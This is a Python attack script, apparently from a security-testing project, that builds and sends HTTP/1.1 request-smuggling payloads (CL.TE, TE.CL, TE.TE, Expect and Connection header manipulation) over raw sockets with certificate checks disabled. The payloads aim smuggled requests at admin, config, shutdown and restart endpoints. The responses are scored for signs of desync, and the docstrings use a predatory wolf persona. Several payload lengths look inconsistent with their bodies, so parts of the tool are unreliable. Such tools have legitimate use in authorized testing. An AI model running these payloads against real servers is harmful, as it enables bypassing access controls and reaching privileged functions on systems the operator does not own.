#!/usr/bin/env python3
"""
HTTP Request Smuggling Exploits

These exploits leverage HTTP/1.1 desynchronization attacks to bypass security controls and manipulate request/response isolation. Based on 2025 research showing persistent weaknesses in HTTP/1.1 implementations.

The system coordinates desync attacks using 'Expect' headers, Content-Length manipulation, and Transfer-Encoding confusion to systematically test for smuggling vulnerabilities.
"""

import asyncio
import logging
import socket
import ssl
from typing import Any
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class HTTPRequestSmuggling:
    """
    HTTP Request Smuggling exploit class that systematically tests for desync vulnerabilities in HTTP/1.1 implementations through coordinated attack vectors.
    """

    def __init__(self, target_url: str = "http://localhost:8000"):
        self.target_url = target_url.rstrip("/")
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or (
            443 if self.parsed_url.scheme == "https" else 80
        )
        self.use_ssl = self.parsed_url.scheme == "https"

    async def send_raw_request(
        self, raw_request: bytes
    ) -> tuple[int, str, dict[str, str]]:
        """
        🐺 *low growl* Send raw HTTP request bytes to bypass aiohttp parsing
        and test server response to malformed requests.
        """
        try:
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)

            # Connect and send raw request
            sock.connect((self.host, self.port))
            sock.sendall(raw_request)

            # Receive response
            response_data = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk
                    # Stop if we have complete headers
                    if b"\r\n\r\n" in response_data:
                        break
                except TimeoutError:
                    break

            sock.close()

            # Parse response
            response_str = response_data.decode("utf-8", errors="ignore")
            lines = response_str.split("\r\n")

            # Extract status code
            status_code = 0
            headers = {}
            body = ""

            if lines:
                status_line = lines[0]
                if "HTTP/" in status_line:
                    try:
                        status_code = int(status_line.split()[1])
                    except (IndexError, ValueError):
                        status_code = 0

                # Parse headers
                header_end = False
                for i, line in enumerate(lines[1:], 1):
                    if line == "":
                        header_end = True
                        body = "\r\n".join(lines[i + 1 :])
                        break
                    if ":" in line:
                        key, value = line.split(":", 1)
                        headers[key.strip().lower()] = value.strip()

            return status_code, body, headers

        except Exception as e:
            logger.error(f"Raw request failed: {e!s}")
            return 0, "", {}

    def generate_cl_te_payloads(self) -> list[tuple[str, bytes]]:
        """
        🐺 *teeth gleam with menace* Generate Content-Length vs Transfer-Encoding
        desync payloads. The front-end uses CL, the back-end uses TE.
        """
        payloads = []

        # Basic CL.TE payload
        payload1 = (
            "CL.TE Basic",
            b"POST /api/search HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Length: 13\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"SMUGGLED",
        )
        payloads.append(payload1)

        # CL.TE with chunked body
        payload2 = (
            "CL.TE Chunked",
            b"POST /api/users/create HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Length: 6\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"G",
        )
        payloads.append(payload2)

        # CL.TE with injection attempt
        payload3 = (
            "CL.TE Injection",
            b"POST /api/auth/login HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Length: 54\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"GET /api/admin/users HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload3)

        return payloads

    def generate_te_cl_payloads(self) -> list[tuple[str, bytes]]:
        """
        🐺 *snarls with cunning* Generate Transfer-Encoding vs Content-Length
        desync payloads. The front-end uses TE, the back-end uses CL.
        """
        payloads = []

        # Basic TE.CL payload
        payload1 = (
            "TE.CL Basic",
            b"POST /api/comments/create HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Length: 4\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"12\r\n"
            b"GPOST / HTTP/1.1\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n",
        )
        payloads.append(payload1)

        # TE.CL with admin request
        payload2 = (
            "TE.CL Admin",
            b"POST /api/files/upload HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Length: 4\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"5e\r\n"
            b"GPOST /api/admin/settings HTTP/1.1\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 15\r\n"
            b"\r\n"
            b"x=1\r\n"
            b"0\r\n"
            b"\r\n",
        )
        payloads.append(payload2)

        return payloads

    def generate_te_te_payloads(self) -> list[tuple[str, bytes]]:
        """
        🐺 *howls with predatory satisfaction* Generate Transfer-Encoding vs
        Transfer-Encoding desync payloads using obfuscated headers.
        """
        payloads = []

        # TE.TE with space obfuscation
        payload1 = (
            "TE.TE Space",
            b"POST /api/search HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Transfer-Encoding: xchunked\r\n"
            b"Transfer-Encoding : chunked\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"GPOST /api/admin/debug HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload1)

        # TE.TE with tab obfuscation
        payload2 = (
            "TE.TE Tab",
            b"POST /api/auth/refresh HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"Transfer-Encoding:\tchunked\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"GGET /api/users/admin HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload2)

        # TE.TE with case variation
        payload3 = (
            "TE.TE Case",
            b"POST /api/settings/update HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Transfer-encoding: chunked\r\n"
            b"Transfer-Encoding: xchunked\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"GPOST /api/admin/restart HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload3)

        return payloads

    def generate_expect_payloads(self) -> list[tuple[str, bytes]]:
        """
        🐺 *ears perk with predatory focus* Generate 'Expect' header manipulation
        payloads based on 2025 research showing these can cause desync attacks.
        """
        payloads = []

        # Expect: 100-continue with smuggled request
        payload1 = (
            "Expect Continue",
            b"POST /api/upload HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Length: 54\r\n"
            b"Expect: 100-continue\r\n"
            b"\r\n"
            b"GET /api/admin/config HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload1)

        # Malformed Expect header
        payload2 = (
            "Expect Malformed",
            b"POST /api/data HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Length: 0\r\n"
            b"Expect: 100-continue-and-more\r\n"
            b"\r\n"
            b"GPOST /api/admin/users HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload2)

        # Multiple Expect headers
        payload3 = (
            "Expect Multiple",
            b"POST /api/process HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Length: 0\r\n"
            b"Expect: 100-continue\r\n"
            b"Expect: 417-expectation-failed\r\n"
            b"\r\n"
            b"GGET /api/internal/status HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload3)

        return payloads

    def generate_connection_manipulation_payloads(self) -> list[tuple[str, bytes]]:
        """
        🐺 *pack coordination* Generate Connection header manipulation payloads
        to exploit HTTP connection handling inconsistencies.
        """
        payloads = []

        # Connection: close with keep-alive attempt
        payload1 = (
            "Connection Close",
            b"POST /api/test HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Connection: close\r\n"
            b"Content-Length: 44\r\n"
            b"\r\n"
            b"GET /api/admin/logs HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload1)

        # Multiple Connection headers
        payload2 = (
            "Connection Multiple",
            b"GET /api/status HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Connection: keep-alive\r\n"
            b"Connection: close\r\n"
            b"\r\n"
            b"GPOST /api/admin/shutdown HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload2)

        # Malformed Connection header
        payload3 = (
            "Connection Malformed",
            b"POST /api/webhook HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Connection: keep-alive, upgrade, close\r\n"
            b"Content-Length: 0\r\n"
            b"\r\n"
            b"GGET /api/sensitive/data HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload3)

        return payloads

    async def test_smuggling_payload(self, name: str, payload: bytes) -> dict[str, Any]:
        """
        🐺 *silent stalk* Test a single HTTP request smuggling payload and
        analyze the response for signs of successful desync.
        """
        logger.info(f"🐺 Testing {name} payload...")

        try:
            status_code, body, headers = await self.send_raw_request(payload)

            # Analyze response for smuggling indicators
            smuggling_indicators = {
                "status_code_anomaly": status_code not in [200, 400, 404, 405, 500],
                "content_length_mismatch": False,
                "duplicate_headers": False,
                "malformed_response": False,
                "admin_content": False,
                "debug_info": False,
            }

            # Check for content-length mismatch
            if "content-length" in headers:
                try:
                    declared_length = int(headers["content-length"])
                    actual_length = len(body.encode("utf-8"))
                    smuggling_indicators["content_length_mismatch"] = (
                        abs(declared_length - actual_length) > 10
                    )
                except ValueError:
                    smuggling_indicators["malformed_response"] = True

            # Check for admin/sensitive content leakage
            admin_keywords = [
                "admin",
                "debug",
                "internal",
                "config",
                "sensitive",
                "private",
            ]
            smuggling_indicators["admin_content"] = any(
                keyword in body.lower() for keyword in admin_keywords
            )

            # Check for debug information
            debug_keywords = ["traceback", "exception", "error", "stack", "dump"]
            smuggling_indicators["debug_info"] = any(
                keyword in body.lower() for keyword in debug_keywords
            )

            # Check for malformed response structure
            if status_code == 0 or (not body and status_code == 200):
                smuggling_indicators["malformed_response"] = True

            success_score = sum(smuggling_indicators.values())

            result = {
                "name": name,
                "status_code": status_code,
                "response_length": len(body),
                "headers": headers,
                "indicators": smuggling_indicators,
                "success_score": success_score,
                "potentially_successful": success_score >= 2,
                "body_preview": body[:200] if body else "",
            }

            if result["potentially_successful"]:
                logger.warning(
                    f"🐺 POTENTIAL SMUGGLING SUCCESS: {name} (score: {success_score})"
                )

            return result

        except Exception as e:
            logger.error(f"Error testing {name}: {e!s}")
            return {
                "name": name,
                "error": str(e),
                "success_score": 0,
                "potentially_successful": False,
            }

    async def run_comprehensive_smuggling_test(self) -> dict[str, Any]:
        """
        🐺 *alpha pack hunt* Run comprehensive HTTP request smuggling tests
        across all attack vectors.
        """
        logger.info("🐺 Starting comprehensive HTTP request smuggling test...")

        all_payloads = []
        all_payloads.extend(self.generate_cl_te_payloads())
        all_payloads.extend(self.generate_te_cl_payloads())
        all_payloads.extend(self.generate_te_te_payloads())
        all_payloads.extend(self.generate_expect_payloads())
        all_payloads.extend(self.generate_connection_manipulation_payloads())

        results = {
            "target_url": self.target_url,
            "total_payloads": len(all_payloads),
            "successful_smuggling": [],
            "suspicious_responses": [],
            "error_responses": [],
            "attack_summary": {
                "cl_te_attacks": 0,
                "te_cl_attacks": 0,
                "te_te_attacks": 0,
                "expect_attacks": 0,
                "connection_attacks": 0,
                "total_successful": 0,
            },
        }

        # Test each payload
        for name, payload in all_payloads:
            result = await self.test_smuggling_payload(name, payload)

            if result.get("potentially_successful", False):
                results["successful_smuggling"].append(result)
                results["attack_summary"]["total_successful"] += 1

                # Categorize by attack type
                if "CL.TE" in name:
                    results["attack_summary"]["cl_te_attacks"] += 1
                elif "TE.CL" in name:
                    results["attack_summary"]["te_cl_attacks"] += 1
                elif "TE.TE" in name:
                    results["attack_summary"]["te_te_attacks"] += 1
                elif "Expect" in name:
                    results["attack_summary"]["expect_attacks"] += 1
                elif "Connection" in name:
                    results["attack_summary"]["connection_attacks"] += 1

            elif result.get("success_score", 0) > 0:
                results["suspicious_responses"].append(result)

            if "error" in result:
                results["error_responses"].append(result)

            # Small delay to avoid overwhelming the server
            await asyncio.sleep(0.1)

        logger.info(
            f"🐺 Smuggling test complete: {results['attack_summary']['total_successful']} potentially successful attacks"
        )
        return results

    def generate_timing_attack_payloads(self) -> list[tuple[str, bytes]]:
        """
        🐺 *predator patience* Generate timing-based smuggling payloads to
        detect subtle desync vulnerabilities through response timing analysis.
        """
        payloads = []

        # Delayed response smuggling
        payload1 = (
            "Timing Delay",
            b"POST /api/slow HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Length: 44\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"GET /api/timing/test HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"\r\n",
        )
        payloads.append(payload1)

        return payloads


async def main():
    """
    🐺 *howls with pack coordination* Main hunting function for HTTP request
    smuggling exploitation.
    """
    target_url = "http://localhost:8000"

    smuggling = HTTPRequestSmuggling(target_url)

    print("🐺 Starting HTTP Request Smuggling Attack...")

    # Run comprehensive smuggling tests
    results = await smuggling.run_comprehensive_smuggling_test()

    print("\n🐺 SMUGGLING HUNT RESULTS:")
    print(f"Total payloads tested: {results['total_payloads']}")
    print(
        f"Potentially successful attacks: {results['attack_summary']['total_successful']}"
    )
    print(f"Suspicious responses: {len(results['suspicious_responses'])}")

    # Show successful attacks by type
    summary = results["attack_summary"]
    if summary["total_successful"] > 0:
        print("\n🐺 SUCCESSFUL ATTACK BREAKDOWN:")
        if summary["cl_te_attacks"] > 0:
            print(f"  CL.TE attacks: {summary['cl_te_attacks']}")
        if summary["te_cl_attacks"] > 0:
            print(f"  TE.CL attacks: {summary['te_cl_attacks']}")
        if summary["te_te_attacks"] > 0:
            print(f"  TE.TE attacks: {summary['te_te_attacks']}")
        if summary["expect_attacks"] > 0:
            print(f"  Expect header attacks: {summary['expect_attacks']}")
        if summary["connection_attacks"] > 0:
            print(f"  Connection header attacks: {summary['connection_attacks']}")

        # Show details of successful attacks
        print("\n🐺 SUCCESSFUL ATTACK DETAILS:")
        for attack in results["successful_smuggling"]:
            print(
                f"  {attack['name']}: Status {attack['status_code']}, Score {attack['success_score']}"
            )
            print(
                f"    Indicators: {[k for k, v in attack['indicators'].items() if v]}"
            )
            if attack.get("body_preview"):
                print(f"    Response preview: {attack['body_preview'][:100]}...")


if __name__ == "__main__":
    asyncio.run(main())
